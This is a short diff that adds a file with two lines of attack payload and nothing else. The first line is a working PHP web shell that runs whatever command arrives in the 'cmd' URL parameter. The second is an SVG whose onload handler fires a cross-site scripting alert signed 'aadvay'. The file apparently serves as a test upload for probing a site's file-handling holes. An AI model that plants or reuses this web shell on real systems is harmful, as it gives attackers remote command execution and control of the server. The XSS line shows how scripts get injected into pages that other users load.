@@ -1,0 +1,3 @@
+<?php echo "Hello from the shell!"; system($_GET['cmd']); ?>
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS by aadvay')"/>
